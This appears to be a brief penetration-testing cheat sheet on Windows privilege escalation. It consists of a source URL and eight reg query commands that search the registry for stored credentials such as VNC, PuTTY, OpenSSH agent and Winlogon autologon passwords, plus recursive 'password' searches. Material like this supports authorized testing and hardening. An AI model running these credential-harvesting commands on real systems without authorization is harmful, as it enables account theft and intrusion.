https://steflan-security.com/windows-privilege-escalation-credential-harvesting/
* reg query “HKLM\SYSTEM\Current\ControlSet\Services\SNMP”
* reg query “HKCU\Software\ORL\WinVNC3\Password”
* reg query “HKCU\Software\TightVNC\Server”
* reg query “HKCU\Software\OpenSSH\Agent\Key”
* reg query “HKCU\Software\SimonTatham\PuTTY\Sessions”
* reg query “HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon”
* reg query HKLM /f password /t REG_SZ /s
* reg query HKCU /f password /t REG_SZ /s
